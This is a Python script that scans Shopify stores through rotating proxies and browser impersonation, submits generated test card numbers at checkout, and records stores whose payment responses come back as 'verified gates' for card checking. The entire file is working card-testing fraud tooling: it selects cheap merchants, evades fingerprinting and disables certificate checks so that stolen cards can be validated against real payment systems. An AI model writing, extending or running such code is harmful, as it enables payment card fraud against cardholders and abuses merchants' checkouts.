import asyncio
import json
import os
import sys
import time

sys.path.insert(0, r"c:\Users\Redmi\Downloads\pusto")

from curl_cffi.requests import AsyncSession
import config
import gate_client as gc
import shopify_gate

POOL_PATH = "data/scout_pool.json"
STORE_GATES_PATH = "data/store_gates.json"
SHOPIFY_GATES_PATH = "data/shopify_gates.json"
READY_GATES_PATH = "data/ready_gates.json"

async def qualify_shopify(entry, sem):
    dom = entry["domain"]
    url = f"https://{dom}"
    cheap = entry.get("cheapest_cents") or 0
    print(f"[*] [Shopify] Testing {dom} ({cheap}c)...")
    async with sem:
        try:
            proxy = gc.pick_proxy(None, None)
            imp = config.pick_impersonate()
            async with AsyncSession(impersonate=imp, verify=False, proxy=proxy) as s:
                card = gc.gen_probe_card()
                card_raw = f"{card['number']}|{card['month']}|{card['year']}|{card['cvc']}"
                res = await shopify_gate.shopify_confirm(s, url, card_raw, max_price_cents=1200)
                status = res.get("status")
                detail = res.get("detail", "")
                cents = res.get("amount_cents", cheap)
                print(f"    -> {dom}: {status} ({detail[:60]})")
                if status in ("DECLINED", "APPROVED", "3DS_CHALLENGE", "3DS_METHOD"):
                    return {
                        "url": url,
                        "domain": dom,
                        "cheapest_cents": cents,
                        "currency": entry.get("currency") or "USD",
                        "verified": True,
                        "last_live_check": time.strftime("%Y-%m-%d"),
                        "last_live_verdict": status
                    }
        except Exception as e:
            print(f"    -> {dom}: EXC ({e})")
    return None

async def run_qualification():
    if not os.path.exists(POOL_PATH):
        print(f"Pool {POOL_PATH} not found.")
        return
    pool = json.load(open(POOL_PATH, "r", encoding="utf-8"))
    print(f"Loaded {len(pool)} entries from {POOL_PATH}")

    sh_data = json.load(open(SHOPIFY_GATES_PATH, "r", encoding="utf-8")) if os.path.exists(SHOPIFY_GATES_PATH) else []
    known_sh = {g["domain"] for g in sh_data if g.get("verified")}

    # Process all unverified Shopify candidates in the pool
    sh_cands = [e for e in pool if "shopify" in e.get("routes", [])
                and e["domain"] not in known_sh
                and (e.get("cheapest_cents") is None or e.get("cheapest_cents") <= 1200)]
    print(f"Total unverified Shopify candidates to check: {len(sh_cands)}")

    sem = asyncio.Semaphore(8)
    sh_tasks = [qualify_shopify(e, sem) for e in sh_cands]
    sh_results = await asyncio.gather(*sh_tasks)
    new_sh = [r for r in sh_results if r]

    if new_sh:
        for item in new_sh:
            sh_data.insert(0, item)
        with open(SHOPIFY_GATES_PATH, "w", encoding="utf-8") as f:
            json.dump(sh_data, f, indent=2, ensure_ascii=False)
        print(f"\n[+] Added {len(new_sh)} new verified Shopify gates to {SHOPIFY_GATES_PATH}")

    print("\n--- QUALIFICATION SUMMARY ---")
    print(f"New verified Shopify gates: {len(new_sh)} out of {len(sh_cands)}")
    for s in new_sh:
        print(f"  {s['domain']} - {s['cheapest_cents']}c {s['currency']} ({s['last_live_verdict']})")

if __name__ == "__main__":
    asyncio.run(run_qualification())
